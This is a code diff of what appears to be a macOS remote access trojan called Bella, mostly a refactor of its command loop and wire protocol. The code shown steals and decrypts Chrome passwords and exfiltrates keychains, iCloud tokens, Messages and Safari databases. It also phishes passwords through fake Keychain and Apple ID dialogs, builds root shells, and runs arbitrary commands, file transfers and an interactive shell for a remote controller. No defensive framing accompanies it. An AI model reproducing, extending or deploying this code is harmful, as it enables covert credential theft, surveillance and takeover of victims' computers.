@@ -274,21 +274,9 @@ def appleIDPhishHelp():
 	return pickle.dumps((returnString, cur_GUI_user()))
 
 def appleIDPhish(username, GUIUser):
-	global bellaConnection
 	while True:
-		### CTRLC listener
-		bellaConnection.settimeout(0.0)
-		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
-			if recv_msg(bellaConnection) == 'sigint9kill':
-				sys.stdout.flush()
-				send_msg('terminated', True) #send back confirmation along with STDERR
-				done = True
-				bellaConnection.settimeout(None)
-				return 1
-		except socket.error as e: #no message, business as usual
-			pass
-		bellaConnection.settimeout(None)
-
+		if sig_int_listener(): #user hit CTRLC, cancel.
+			return
 		check = applepwRead()
 		if isinstance(check, str): #we have file...
 			send_msg("%sApple password already found [%s] %s\n" % (blue_star, check, blue_star), False)
@@ -421,39 +409,38 @@ def chrome_decrypt(encrypted_value, iv, key): #AES decryption using the PBKDF2 k
 		decrypted = "ERROR retrieving password.\n"
 	return decrypted[1] #otherwise we got it
 
-def chrome_dump(safe_storage_key, loginData):
-	returnable = "%s%sPasswords for [%s]%s:\n" % (yellow_star, bold + underline, loginData.split("/")[-2], endANSI)
+def chrome_dump(safe_storage_key, login_data):
+	send_msg("%s%sPasswords for [%s]%s:\n" % (yellow_star, bold + underline, login_data.split("/")[-2], endANSI), False)
 	empty = True
-	for i, x in enumerate(chrome_process(safe_storage_key, "%s" % loginData)):
-		returnable += "%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s\n" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2])
+	for i, x in enumerate(chrome_process(safe_storage_key, "%s" % login_data)):
+		send_msg("%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s\n" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2]), False)
 		empty = False
 	if not empty:
-		return returnable
+		send_msg('', False)
 	else:
-		return "%sFound no Chrome Passwords for [%s].\n" % (blue_star, loginData.split("/")[-2])
+		send_msg("%sFound no Chrome Passwords for [%s].\n" % (blue_star, login_data.split("/")[-2]), False)
 
-def chrome_process(safe_storage_key, loginData):
+def chrome_process(safe_storage_key, login_data):
 	iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
 	key = hashlib.pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
 	copypath = tempfile.mkdtemp() #work around for locking DB
-	dbcopy = protected_file_reader(loginData) #again, shouldnt matter because we only can decrypt DBs with keys
+	dbcopy = protected_file_reader(login_data) #again, shouldnt matter because we only can decrypt DBs with keys
 	with open('%s/chrome' % copypath, 'wb') as content:
 		content.write(dbcopy) #if chrome is open, the DB will be locked, so get around by making a temp copy
 	database = sqlite3.connect('%s/chrome' % copypath)
 	sql = 'select username_value, password_value, origin_url from logins'
-	decryptedList = []
+	decrypted_list = []
 	with database:
-		for user, encryptedPass, url in database.execute(sql):
-			if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
+		for user, encrypted_pass, url in database.execute(sql):
+			if user == "" or (encrypted_pass[:3] != b'v10'): #user will be empty if they have selected "never" store password
 				continue
 			else:
-				urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chrome_decrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
-				decryptedList.append(urlUserPassDecrypted)
+				url_user_pass_decrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chrome_decrypt(encrypted_pass, iv, key=key).encode('ascii', 'ignore'))
+				decrypted_list.append(url_user_pass_decrypted)
 	shutil.rmtree(copypath)
-	return decryptedList
+	return decrypted_list
 
 def chrome_safe_storage():
-	global bellaConnection
 	retString = ""
 	check = chromeSSRead()
 	if isinstance(check, str):
@@ -461,17 +448,8 @@ def chrome_safe_storage():
 		return
 	while True:
 		### CTRLC listener
-		bellaConnection.settimeout(0.0)
-		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
-			if recv_msg(bellaConnection) == 'sigint9kill':
-				sys.stdout.flush()
-				send_msg('terminated', True) #send back confirmation along with STDERR
-				done = True
-				bellaConnection.settimeout(None)
-				return 1
-		except socket.error as e: #no message, business as usual
-			pass
-		bellaConnection.settimeout(None)
+		if sig_int_listener(): #user hit CTRLC, cancel.
+			return
 		kchain = getKeychains()
 		send_msg("%sUsing [%s] as keychain.\n" % (yellow_star, kchain), False)
 
@@ -964,12 +942,12 @@ def kill_pid(pid):
 
 def keychain_download():
 	try:
-		returnVal = []
+		serial = []
 		for x in globber("/Users/*/Library/Keychains/login.keychain*"):
 			#with open(x, 'rb') as content:
 			content = protected_file_reader(x) #will return us permission acceptable file info
 			user = x.split("/")[2]
-			returnVal.append(pickle.dumps(['%s_login.keychain' % user, content]))
+			serial.append(pickle.dumps(['%s_login.keychain' % user, content]))
 
 		for iCloudKey in globber("/Users/*/Library/Keychains/*/keychain-2.db"):
 			iCloudZip = StringIO.StringIO()
@@ -981,11 +959,11 @@ def keychain_download():
 					zipped.writestr(files, content)
 			with zipfile.ZipFile(iCloudZip, mode='a', compression=zipfile.ZIP_DEFLATED) as zipped:
 				zipped.writestr(joiner.split("/")[-1], 'Keychain UUID')
-			returnVal.append(pickle.dumps(["%s_iCloudKeychain.zip" % iCloudKey.split("/")[2], iCloudZip.getvalue()]))
+			serial.append(pickle.dumps(["%s_iCloudKeychain.zip" % iCloudKey.split("/")[2], iCloudZip.getvalue()]))
 		if is_there_SUID_shell():
 			keys = protected_file_reader("/Library/Keychains/System.keychain")
-			returnVal.append(pickle.dumps(["System.keychain", keys]))
-		return 'keychain_download' + pickle.dumps(returnVal)
+			serial.append(pickle.dumps(["System.keychain", keys]))
+		return 'keychain_download' + pickle.dumps(serial)
 	except Exception, e:
 		return (red_minus + "Error reading keychains.\n%s\n") % str(e)
 
@@ -1252,7 +1230,7 @@ def bella_info():
 		sipEnabled = False
 
 	kchain = getKeychains()
-	
+
 	if not sipEnabled: #sipDisabled allows us to check like .1% of cases where user is on El Cap and has opted out of SIP
 		if is_there_SUID_shell():
 			kcpayload = readDB('keychaindump', True)
@@ -1371,7 +1349,7 @@ def recvaux(sock, n, length):
 		if not packet:
 			return None
 		data += packet
-	return pickle.loads(data) #convert from serialized into normal.
+	return data #convert from serialized into normal.
 
 def make_SUID_root_binary(password, LPEpath):
 	global ROOT_SHELL_PATH
@@ -1593,7 +1571,6 @@ def tokenFactory(authCode):
 		return '%s' % e
 
 def tokenForce():
-	global bellaConnection
 	token = tokenRead()
 	if token != False:
 		send_msg("%sFound already generated token!%s\n%s" % (blue_star, blue_star, token), True)
@@ -1603,17 +1580,8 @@ def tokenForce():
 		### switch out for chain breaker
 		from Foundation import NSData, NSPropertyListSerialization
 		### CTRLC listener
-		bellaConnection.settimeout(0.0)
-		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
-			if recv_msg(bellaConnection) == 'sigint9kill':
-				sys.stdout.flush()
-				send_msg('terminated', True) #send back confirmation along with STDERR
-				done = True
-				bellaConnection.settimeout(None)
-				return 1
-		except socket.error as e: #no message, business as usual
-			pass
-		bellaConnection.settimeout(None)
+		if sig_int_listener(): #user hit CTRLC, cancel.
+			return
 		kchain = getKeychains()
 		send_msg("%sUsing [%s] as keychain.\n" % (yellow_star, kchain), False)
 
@@ -1648,7 +1616,7 @@ def tokenForce():
 		token_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, 0, None, None)[0]
 		tokz = "[%s | %s]\n" % (token_plist["appleAccountInfo"]["primaryEmail"], token_plist["appleAccountInfo"]["fullName"])
 		tokz += "%s:%s\n" % (token_plist["appleAccountInfo"]["dsPrsID"], token_plist["tokens"]["mmeAuthToken"])
-		logged = updateDB(encrypt(tokz), 'mme_token') #update the DB....
+		logged = updateDB(encrypt(tokz.decode('utf-8').encode('ascii', 'ignore')), 'mme_token') #update the DB....
 		send_msg(tokz, True)
 		return 1
 
@@ -1691,10 +1659,10 @@ def screenShot():
 		return "screenCapture%s" % "error"
 
 def send_msg(msg, EOF):
-	global bellaConnection
-	msg = pickle.dumps((msg, EOF))
-	finalMsg = struct.pack('>I', len(msg)) + msg #serialize into string. pack bytes so that recv function knows how many bytes to loop
-	bellaConnection.sendall(finalMsg) #send serialized
+	global bella_connection
+	#msg = pickle.dumps((msg, EOF))
+	final_msg = struct.pack('>I', len(msg)) + struct.pack('?', EOF) + msg #serialize into string. pack bytes so that recv function knows how many bytes to loop
+	bella_connection.sendall(final_msg) #send serialized
 
 def getWifi():
 	ssid = subprocess.Popen("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -1704,8 +1672,26 @@ def getWifi():
 		value = "AirPort: Off"
 	return value
 
+def sig_int_listener():
+	global bella_connection
+	print 'Listener called'
+	### CTRLC listener
+	bella_connection.settimeout(0.0)
+	try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
+		print 'Checking for messge'
+		if recv_msg(bella_connection) == 'sigint9kill':
+			print 'Got message'
+			sys.stdout.flush()
+			send_msg('terminated', True) #send back confirmation along with STDERR
+			print 'Sent terminator.'
+			bella_connection.settimeout(None)
+			return True
+	except socket.error as e: #no message, business as usual
+		pass
+	bella_connection.settimeout(None)
+	return False
+
 def user_pass_phish():
-	global bellaConnection
 	userTB = cur_GUI_user()
 	icon = readDB('lock_icon', True)
 	if not icon:
@@ -1717,18 +1703,8 @@ def user_pass_phish():
 		script = "launchctl asuser %s osascript -e 'tell app \"Finder\" to activate' -e 'tell app \"Finder\" to display dialog \"Keychain Access wants to use the \\\"login\\\" keychain. \" default answer \"\" buttons {\"Cancel\", \"OK\"} default button \"OK\" with icon file \"%s\" with hidden answer giving up after 15'" % (bella_UID, path)
 	send_msg("Attempting to phish current GUI User [%s]\n" % userTB, False)
 	while True:
-		### CTRLC listener
-		bellaConnection.settimeout(0.0)
-		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
-			if recv_msg(bellaConnection) == 'sigint9kill':
-				sys.stdout.flush()
-				send_msg('terminated', True) #send back confirmation along with STDERR
-				done = True
-				bellaConnection.settimeout(None)
-				return 1
-		except socket.error as e: #no message, business as usual
-			pass
-		bellaConnection.settimeout(None)
+		if sig_int_listener(): #user hit CTRLC, cancel.
+			return
 		check = local_pw_read()
 		if isinstance(check, str):
 			send_msg("%sAccount password already found:\n%s\n" % (blue_star, check.replace("\n", "")), True)
@@ -1790,7 +1766,7 @@ def bella(*Emma):
 	### For now, we will assume that the initial user to run Bella is NOT root ###
 	### This assumption is made bc if we have a root shell, we likely have a user shell ###
 	###set global whoami to current user, this will be stored as the original user in DB
-	global bellaConnection
+	global bella_connection
 
 	if not os.path.isdir(get_bella_path()):
 		os.makedirs(get_bella_path())
@@ -1823,11 +1799,11 @@ def bella(*Emma):
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		sock.settimeout(None)
-		bellaConnection = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)
+		bella_connection = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)
 
 		try:
 			print 'Connecting'
-			bellaConnection.connect((host,port))
+			bella_connection.connect((host,port))
 			print 'Connected'
 		except socket.error as e:
 			if e[0] == 61:
@@ -1844,7 +1820,7 @@ def bella(*Emma):
 			try:
 				remove_SUID_shell() #remove if it exists
 				print '%sAwaiting%s Data' % (yellow, endANSI)
-				data = recv_msg(bellaConnection)
+				data = recv_msg(bella_connection)
 				print '%sReceived%s Data' % (green, endANSI)
 				if not data:
 					print 'Control disconnected'
@@ -1968,18 +1944,16 @@ def bella(*Emma):
 					else:
 						path = payload_generator(reader)
 						mike_helper(path)
-
 				elif data == "chrome_dump":
-					returnVal = ""
 					checkChrome = chromeSSRead()
 					if isinstance(checkChrome, str):
 						safe_storage_key = checkChrome
-						loginData = glob("/Users/%s/Library/Application Support/Google/Chrome/*/Login Data" % get_bella_user()) #dont want to do all
-						for x in loginData:
-							returnVal += chrome_dump(safe_storage_key, x)
-						send_msg(returnVal, True)
+						login_data = glob("/Users/%s/Library/Application Support/Google/Chrome/*/Login Data" % get_bella_user()) #dont want to do all
+						for x in login_data:
+							chrome_dump(safe_storage_key, x)
+						send_msg('', True)
 					else:
-						send_msg("%s%sNo Chrome Safe Storage Key found!\n" % (returnVal, red_minus), True)
+						send_msg("%sNo Chrome Safe Storage Key found!\n" % red_minus, True)
 
 				elif data == "iCloud_FMIP":
 					(username, password, usingToken) = iCloud_auth_process(False)
@@ -2020,13 +1994,15 @@ def bella(*Emma):
 					send_msg(set_client_name(name), True)
 
 				elif data == 'chat_history':
-					chatDb = globber("/Users/*/Library/Messages/chat.db") #just get first chat DB
-					serial = []
-					for x in chatDb:
-						data = bz2.compress(protected_file_reader(x))
-						serial.append((x.split("/")[2], data))
-					serialized = pickle.dumps(serial)
-					send_msg("C5EBDE1F" + serialized, True)
+					chat_db = globber("/Users/*/Library/Messages/chat.db")
+					serial = [] #we do all of this custom serialization because it is way faster and more space efficient.
+					for x in chat_db:
+						data = protected_file_reader(x)
+						send_msg("%sFound messages DB for %s [%s]\n" % (blue_star, x.split("/")[2], byte_convert(len(data))), False)
+						serial.append('C5EBDE1F'.join( (x.split("/")[2], data) ))
+					send_msg("%sSending databases over.\n" % yellow_star, False)
+					send_msg("C5EBDE1F", False)
+					send_msg('C5EBDE1F_tuple'.join(serial), True)
 
 				elif data == 'safari_history':
 					historyDb = globber("/Users/*/Library/Safari/History.db")
@@ -2046,34 +2022,35 @@ def bella(*Emma):
 							except:
 								pass
 						content = bz2.compress(content)
-						serial.append((history.split("/")[2], content)) #append owner of history
+						serial.append('6E87CF0B'.join((history.split("/")[2], content))) #append owner of history
 						shutil.rmtree(copypath)
-					serialized = pickle.dumps(serial)
-					send_msg("6E87CF0B" + serialized, True)
+					send_msg("6E87CF0B", False)
+					send_msg('6E87CF0B_tuple'.join(serial), True)
 
 				elif data.startswith('interactive_shell'):
 					interactive_shell_port = data.split(':::')[1]
 					start_interactive_shell(interactive_shell_port)
 
 				elif data.startswith('download'):
-					fileName = data[8:]
+					file_name = data[8:]
 					try:
-						with open(fileName, 'rb') as content:
+						with open(file_name, 'rb') as content:
 							file_content = content.read()
-						send_msg("%sFound [%s]. Preparing for download.\n" % (yellow_star, fileName), False)
-						send_msg("downloader%s" % pickle.dumps((file_content, fileName)), True) #pack tuple
+						send_msg("%sFound [%s]. Preparing for download.\n" % (yellow_star, file_name), False)
+						send_msg("downloader", False)
+						send_msg(file_content + 'dl_delimiter_x22x32' + file_name, True)
 					except IOError, e:
 						send_msg("%s%s\n" % (red_minus, e), True)
 					except OSError, e:
 						send_msg("%s%s\n" % (red_minus, e), True)
 
 				elif data.startswith('uploader'):
-					(file_content, fileName) = pickle.loads(data[8:])
+					(file_content, file_name) = data[8:].split('ul_delimeter_x22x32')
 					try:
-						send_msg("%sBeginning write of [%s].\n" % (yellow_star, fileName), False)
-						with open(fileName, 'wb') as content:
+						send_msg("%sBeginning write of [%s].\n" % (yellow_star, file_name), False)
+						with open(file_name, 'wb') as content:
 							content.write(file_content)
-						send_msg("%sSucessfully wrote [%s/%s]\n" % (blue_star, os.getcwd(), fileName), True)
+						send_msg("%sSucessfully wrote [%s/%s]\n" % (blue_star, os.getcwd(), file_name), True)
 					except IOError, e:
 						send_msg("%s%s\n" % (red_minus, e), True)
 					except OSError, e:
@@ -2149,18 +2126,18 @@ def bella(*Emma):
 						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
 						done = False
 						while proc.poll() == None:
-							bellaConnection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
+							bella_connection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
 							try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
-								if recv_msg(bellaConnection) == 'sigint9kill':
+								if recv_msg(bella_connection) == 'sigint9kill':
 									sys.stdout.flush()
 									proc.terminate()
 									send_msg('terminated', True) #send back confirmation along with STDERR
 									done = True
-									bellaConnection.settimeout(None)
+									bella_connection.settimeout(None)
 									break
 							except socket.error as e: #no message, business as usual
 								pass
-							bellaConnection.settimeout(None)
+							bella_connection.settimeout(None)
 							out = select.select([proc.stdout.fileno()], [], [], 5)[0]
 							if out:
 								line = proc.stdout.readline()
@@ -2204,7 +2181,7 @@ def bella(*Emma):
 				send_msg('%sMalfunction:\n```\n%s%s%s\n```\n' % (red_minus, red, bella_error, endANSI), True) #send error to CC, then continue
 				continue
 		try:
-			bellaConnection.close()
+			bella_connection.close()
 		except:
 			pass
 
